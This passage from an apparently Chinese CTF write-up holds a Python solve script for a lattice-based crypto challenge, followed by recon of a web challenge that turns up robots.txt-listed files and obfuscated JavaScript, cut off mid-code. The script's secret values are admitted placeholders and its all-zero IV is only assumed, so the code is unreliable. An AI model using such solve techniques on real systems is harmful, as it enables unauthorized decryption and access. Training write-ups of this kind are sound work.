class="number">8</span>, <span class="number">103</span>], [<span class="number">104</span>, <span class="number">42</span>, <span class="number">68</span>, <span class="number">37</span>], [<span class="number">104</span>, <span class="number">55</span>, <span class="number">41</span>, <span class="number">38</span>], [<span class="number">120</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">87</span>], [<span class="number">120</span>, <span class="number">121</span>, <span class="number">20</span>, <span class="number">67</span>], [<span class="number">58</span>, <span class="number">123</span>, <span class="number">50</span>, <span class="number">28</span>], [<span class="number">103</span>, <span class="number">62</span>, <span class="number">58</span>, <span class="number">20</span>], [<span class="number">97</span>, <span class="number">27</span>, <span class="number">89</span>, <span class="number">102</span>], [<span class="number">7</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">108</span>], [<span class="number">73</span>, <span class="number">60</span>, <span class="number">10</span>, <span class="number">77</span>], [<span class="number">56</span>, <span class="number">72</span>, <span class="number">103</span>, <span class="number">69</span>], [<span class="number">101</span>, <span class="number">89</span>, <span class="number">18</span>, <span class="number">66</span>], [<span class="number">115</span>, <span class="number">35</span>, <span class="number">80</span>, <span class="number">36</span>], [<span class="number">98</span>, <span class="number">103</span>, <span class="number">39</span>, <span class="number">63</span>], [<span class="number">29</span>, <span class="number">126</span>, <span class="number">67</span>, <span class="number">76</span>], [<span class="number">27</span>, <span class="number">97</span>, <span class="number">15</span>, <span class="number">79</span>], [<span class="number">36</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">90</span>], [<span class="number">126</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">42</span>], [<span class="number">115</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">126</span>], [<span class="number">78</span>, <span class="number">80</span>, <span class="number">62</span>, <span class="number">83</span>], [<span class="number">60</span>, <span class="number">11</span>, <span class="number">31</span>, <span class="number">88</span>], [<span class="number">16</span>, <span class="number">73</span>, <span class="number">108</span>, <span class="number">13</span>]]</span><br><span class="line">q = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Brute-force to find t0, t1, t2 (this is a placeholder; actual code would run this)</span></span><br><span class="line"><span class="comment"># After brute-forcing, suppose we find t = (47, 33, 58)</span></span><br><span class="line">t0, t1, t2 = <span class="number">47</span>, <span class="number">33</span>, <span class="number">58</span></span><br><span class="line">s = [<span class="number">1</span>, t0, t1, t2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt C to get M_bits</span></span><br><span class="line">M_bits = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> C:</span><br><span class="line">    product = (s[<span class="number">0</span>]*row[<span class="number">0</span>] + s[<span class="number">1</span>]*row[<span class="number">1</span>] + s[<span class="number">2</span>]*row[<span class="number">2</span>] + s[<span class="number">3</span>]*row[<span class="number">3</span>]) % q</span><br><span class="line">    product_signed = product <span class="keyword">if</span> product &lt;= q//<span class="number">2</span> <span class="keyword">else</span> product - q</span><br><span class="line">    <span class="comment"># Check if close to 63 (M[i] = 1) or 0 (M[i] = 0)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(product_signed - <span class="number">63</span>) &lt;= <span class="number">20</span>:</span><br><span class="line">        M_bits.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        M_bits.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert bits to bytes</span></span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, M_bits))</span><br><span class="line"><span class="comment"># Pad with zeros to make length multiple of 8</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(bits) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">    bits += <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(bits) % <span class="number">8</span>)</span><br><span class="line">hint_bytes = <span class="built_in">bytes</span>([<span class="built_in">int</span>(bits[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>)])</span><br><span class="line">hint = hint_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The AES key is provided in the problem output</span></span><br><span class="line">key = <span class="string">b&#x27;\x8fj\x94\x98-\x1fd\xd5\x89\xbe\xa9*Tu\x90\xb7&#x27;</span></span><br><span class="line">encrypted = <span class="string">b&#x27;\x9fT@\xbc\x82\x8esQ\x1e\xd8\x1d\xdb\x9b\xb4\xf8rU\xc8\xa0\xcb\xaf H\xa9.\x04\x1e\xd2\x92\x1f\x0fBja-\x965x\xa8@\xc9x\xf9\xaf\x87\xd1\xa5&#125;\xfc\x1b\xe0#\xc3m\xc9\x8973\x1c\x1f\x13\x8f\xb2a\xae\xa9]\xb9\xc2\xe8\x83A\x80\x13g\xc9a\x1c&lt;\x8a\x9c&amp;\xd9\xbd\x06\xef\xba9\xb0\x03\x9f\x022\xc9\x13\x9a\xffXPG\xc6o\xc0\xeaV7)XG9L\x84N7U\xe3Wn0G\x8e\xd3\x04(\n\x08\xb9\x17\xe6\xf1\xaa\xb7\x8a@$\x16\x13\x06A\x00\xc9Z\xdf\x7fQ\xc9\x08\xb4\xf3P\xfcpe\xe2\xeb\x96\x0e(-\xde\x17\xd1\x01\x1c_\x82\x8b\x9fw\xc8\x86\xfbw\xb5\xf7\xd0\xc8\x1784\xe3?\x00\x0b.)\xb7\xbc\x8e&#123;\xe0\xae\x8d$\x0f\x19\&#x27;\xb6\xee@d\x00\xd9\x84\x8c\x0e\xa3,\xc6a\xa3\xba*1\xfd&lt;\xfd\x18\xd6\x9e\x8c4\x8e#\xfd\xbd&amp;0R\xeddE,\xed\xb6\x1e\x00\x11\xa6K\xd3\x1dT\x8c5\x8e\x00\xea\x10\xe9\&#x27;u&quot;B#\xa1#\xd8\xe3\xf5j\xbc\x94M\xda\xe3\xcb*\xf0W1\xa0\x80\x1d\xfc\xbfo\x01?(da\r\xb6\x86\xd0\x90\x88Z\xa1`B\x89\x89\x89\xb3v\xa5\xf0\xe0\x0c\x8e\xcc+P\xfc\xfd#\x83\xe9\x93\x96\n\xf2\xa5\xfb\xc3\xc5\xaa\x9e\x89\x93\xb6\xf5\xea\x8c%NY\xc3\x0eR\xfas\xa1\x13\xf2/*\xce\x8b_:_r\xeb\xbe\x0b\x8a\x8c\x97\x7f|m&#125;\xae\xa9I\x95\xcc\xe7\x80\xa5yC4\x1f5\xa4P\xc5\xbf.\xf9V\xe8|\xbb\xc3\xcb\x98&amp;\&#x27;JB\x99\x94\xc0\r$\x0b\xbe48u\xeb\xca\xa1\xfbb\xd8_R\x97\x8e\xaeI\xfc\xc2\xb2\xd2#@\xec\x16\xf1\xd7eCQ\x1cO\x13\xca\xb5\xd3\x1a\xb1\xf1_D\x80\x06\xa5\xbe\xbev\xbd\xd6\xbb\x9a\xc9x\x9cf:\xcb&gt;\xa2\xe1\xcad\xde]aw\xa0\xdc\xb2\xb3&#123;+\x85\x8d\x8b\xc5\rT\xcc\xd9X\xd5\x9b\r&lt;\x99m\xb8b6s\xbfp\x0eo~\xe9&amp;\xb2&#123;\xbe\xee\x93\xd2N1\\\x94\x968IWO7\xcb\xb6e\x80\xf7\x9air\xb2~\x17\x1cF\x0f\x82T]RBX\xdex\x13\x85\xfa\xcd-\xce\xdc\xe4\xe5^\x99u\xb5\x01\xd0-\xc3C\xcd\xc4y6\xb7\x9d|L1\xe74\xf7\x8cH\xe9\xa9\xfav\n\xec;\xf2\xa2w\xfb\x13_b\r)z!\xa3\xc8\xa8\xc2\xd2\x10\x00\x11\x11\r\xb2&amp;\xfb\x04&amp;\x84&quot;&gt;x6l[\x06n&gt;\xa0\xbe\x9c`\xa7\x9e\xe0\xfb\x85\x91\xc4,\xcf\xac\xe11@a\xed3@\xfd&#125;\x8e\xfaTp\xcb7\xe7\xbf\xd4\xe0~b\xd9\xe0&lt;\xba\x81\xd4&quot;e\xfc\x939|j#0H\x86\xf8\x0b\x03\xd2\xe8\xf5\xe55\xdc\xc8\x06\\\xb7)\xcc\x9b\&#x27;\xf12&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Assuming IV is all zeros (common if not specified)</span></span><br><span class="line">iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">decrypted = unpad(cipher.decrypt(encrypted), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤不可见字符和非ASCII字符</span></span><br><span class="line">filtered = <span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">    <span class="built_in">chr</span>(byte) <span class="keyword">if</span> <span class="number">32</span> &lt;= byte &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>  <span class="comment"># 保留可打印ASCII字符，其他替换为空</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> decrypted</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Filtered plaintext:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(filtered)</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-133904.jpg" alt="1"></p><h2 id="外国山海经"><a href="#外国山海经" class="headerlink" title="外国山海经"></a>外国山海经</h2><p>访问<code>/robots.txt</code>，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#shu.php  sha.php  wa.php  flag.php  flag.php.swp</span><br></pre></td></tr></table></figure><p>访问<code>flag.php</code>，得到混淆js，解js混淆</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">_0x5bfa63, _0x281ba4</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x628a90 = &#123;</span><br><span class="line">        <span class="attr">_0x28e595</span>: <span class="number">0x190</span>,</span><br><span class="line">        <span class="attr">_0x466706</span>: <span class="number">0x17a</span>,</span><br><span class="line">        <span class="attr">_0x570276</span>: <span class="number">0x192</span>,</span><br><span class="line">        <span class="attr">_0x4e238d</span>: <span class="number">0x128</span>,</span><br><span class="line">        <span class="attr">_0xf7fd91</span>: <span class="number">0x139</span>,</span><br><span class="line">        <span class="attr">_0x4ff7de</span>: <span class="number">0x144</span>,</span><br><span class="line">        <span class="attr">_0xf17c9a</span>: <span class="number">0x132</span>,</span><br><span class="line">        <span class="attr">_0x140c6f</span>: <span class="number">0x117</span>,</span><br><span class="line">        <span class="attr">_0x2e9d5d</span>: <span class="number">0x124</span>,</span><br><span class="line">        <span class="attr">_0x27ecfb</span>: <span class="number">0x16f</span>,</span><br><span class="line">        <span class="attr">_0x1f08ae</span>: <span class="number">0x16e</span>,</span><br><span class="line">        <span class="attr">_0x429bb1</span>: <span class="number">0x185</span>,</span><br><span class="line">        <span class="attr">_0x5259a4</span>: <span class="number">0x186</span>,</span><br><span class="line">        <span class="attr">_0xf069bc</span>: <span class="number">0xfc</span>,</span><br><span class="line">        <span class="attr">_0x36775b</span>: <span class="number">0xda</span>,</span><br><span class="line">        <span class="attr">_0x1a81bc</span>: <span class="number">0x101</span>,</span><br><span class="line">        <span class="attr">_0x4fbeb3</span>: <span class="number">0x159</span>,</span><br><span class="line">        <span class="attr">_0x5f0ac4</span>: <span class="number">0x16a</span>,</span><br><span class="line">        <span class="attr">_0x2b1d0c</span>: <span class="number">0x15f</span>,</span><br><span class="line">        <span class="attr">_0x45b6b4</span>: <span class="number">0x160</span>,</span><br><span class="line">        <span class="attr">_0x542167</span>: <span class="number">0x17c</span>,</span><br><span class="line">        <span class="attr">_0x300668</span>: <span class="number">0x15a</span>,</span><br><span class="line">        <span class="attr">_0x5d82fc</span>: <span class="number">0x13b</span>,</span><br><span class="line">        <span class="attr">_0x4fc9cc</span>: <span class="number">0x176</span>,</span><br><span class="line">        <span class="attr">_0x1f53f0</span>: <span class="number">0x146</span>,</span><br><span class="line">        <span class="attr">_0x99afde</span>: <span class="number">0xfe</span>,</span><br><span class="line">        <span class="attr">_0x39b153</span>: <span class="number">0xf0</span>,</span><br><span class="line">        <span class="attr">_0xed7676</span>: <span class="number">0xef</span>,</span><br><span class="line">        <span class="attr">_0x3a214b</span>: <span class="number">0x10c</span>,</span><br><span class="line">        <span class="attr">_0x18fd83</span>: <span class="number">0x115</span>,</span><br><span class="line">        <span class="attr">_0x44ec87</span>: <span class="number">0x166</span>,</span><br><span class="line">        <span class="attr">_0x3009e4</span>: <span class="number">0x163</span>,</span><br><span class="line">        <span class="attr">_0x362ea9</span>: <span class="number">0x170</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x28823e = &#123;</span><br><span class="line">        <span class="attr">_0x456064</span>: <span class="number">0x20a</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0xb2ea4e = &#123;</span><br><span class="line">        <span class="attr">_0x332eb1</span>: <span class="number">0x262</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_0x5afd48</span>(<span class="params">_0x372bcf, _0x587d2c, _0x343524, 